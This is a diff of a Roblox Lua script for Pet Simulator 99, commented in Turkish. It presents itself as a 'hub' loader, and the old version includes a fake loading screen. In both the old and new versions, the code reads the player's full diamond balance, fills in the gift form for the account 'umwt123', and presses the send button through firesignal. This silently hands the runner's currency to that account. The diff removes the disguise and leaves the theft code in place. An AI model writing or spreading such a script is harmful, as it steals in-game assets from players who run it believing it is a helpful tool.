@@ -1,64 +1,15 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- ====================== LOADING SCREEN ======================
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "PS99Loader"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+print("🚀 PS99 Elmas Gönderme Başladı...")
 
-local BlackBG = Instance.new("Frame")
-BlackBG.Size = UDim2.new(1, 0, 1, 0)
-BlackBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-BlackBG.BorderSizePixel = 0
-BlackBG.Parent = ScreenGui
+task.wait(2)
 
-local LoadingText = Instance.new("TextLabel")
-LoadingText.Size = UDim2.new(0, 500, 0, 100)
-LoadingText.Position = UDim2.new(0.5, -250, 0.42, 0)
-LoadingText.BackgroundTransparency = 1
-LoadingText.Text = "Pet Simulator 99 Hub Loading..."
-LoadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
-LoadingText.TextScaled = true
-LoadingText.Font = Enum.Font.GothamBold
-LoadingText.Parent = BlackBG
-
-local PercentText = Instance.new("TextLabel")
-PercentText.Size = UDim2.new(0, 400, 0, 80)
-PercentText.Position = UDim2.new(0.5, -200, 0.55, 0)
-PercentText.BackgroundTransparency = 1
-PercentText.Text = "0%"
-PercentText.TextColor3 = Color3.fromRGB(255, 0, 0)
-PercentText.TextScaled = true
-PercentText.Font = Enum.Font.GothamBold
-PercentText.Parent = BlackBG
-
-local percent = 0
-spawn(function()
-    while percent < 100 do
-        percent = percent + math.random(6, 13)
-        if percent > 100 then percent = 100 end
-        PercentText.Text = percent .. "%"
-        wait(0.08)
-    end
-    PercentText.Text = "100% - Gift Gönderiliyor"
-    task.wait(2)
-    AutoGift()
-end)
-
-function AutoGift()
-    print("Auto Gift Başladı")
+-- ====================== AUTO ELMAS GÖNDER ======================
+function SendDiamonds()
+    print("Elmas gönderme işlemi başladı...")
     
-    local diamonds = 0
-    if LocalPlayer:FindFirstChild("leaderstats") then
-        for _, v in pairs(LocalPlayer.leaderstats:GetChildren()) do
-            if v.Name:lower():find("diamond") or v.Name:lower():find("gem") then
-                diamonds = v.Value
-                break
-            end
-        end
-    end
+    task.wait(1.5)
     
     -- Username
     local usernameBox = LocalPlayer.PlayerGui:FindFirstChild("Roblox Username", true) 
@@ -66,34 +17,57 @@ function AutoGift()
     if usernameBox then
         usernameBox.Text = "umwt123"
         firesignal(usernameBox.FocusLost)
+        print("✅ Username yazıldı: umwt123")
     end
     
     task.wait(1)
     
-    -- Elmas
+    -- Elmas miktarını bul
+    local diamonds = 0
+    if LocalPlayer:FindFirstChild("leaderstats") then
+        for _, stat in pairs(LocalPlayer.leaderstats:GetChildren()) do
+            if stat.Name:lower():find("diamond") or stat.Name:lower():find("gem") then
+                diamonds = stat.Value
+                break
+            end
+        end
+    end
+    print("Bulunan Elmas: " .. diamonds)
+    
+    -- Elmas kutusuna yaz
     local diamondBox = nil
-    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-        if v:IsA("TextBox") and (v.Text == "0" or v.PlaceholderText:find("0")) then
-            diamondBox = v
+    for _, tb in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+        if tb:IsA("TextBox") and (tb.Text == "0" or tb.PlaceholderText:find("0")) then
+            diamondBox = tb
             break
         end
     end
+    
     if diamondBox then
         diamondBox.Text = tostring(diamonds)
         firesignal(diamondBox.FocusLost)
+        print("✅ Elmas yazıldı: " .. diamonds)
     end
     
     task.wait(1.5)
     
-    -- Gönder Butonu
+    -- Gönder butonu
     local sendBtn = nil
-    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-        if v:IsA("TextButton") and v.Text:find("Gönder") then
-            sendBtn = v
+    for _, btn in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+        if btn:IsA("TextButton") and btn.Text:find("Gönder") then
+            sendBtn = btn
             break
         end
     end
+    
     if sendBtn then
         firesignal(sendBtn.MouseButton1Click)
+        print("✅ GÖNDER butonuna basıldı! Elmas gönderiliyor...")
+    else
+        print("❌ Gönder butonu bulunamadı")
     end
 end
+
+-- Posta kutusunu açmayı dene
+task.wait(1)
+SendDiamonds()
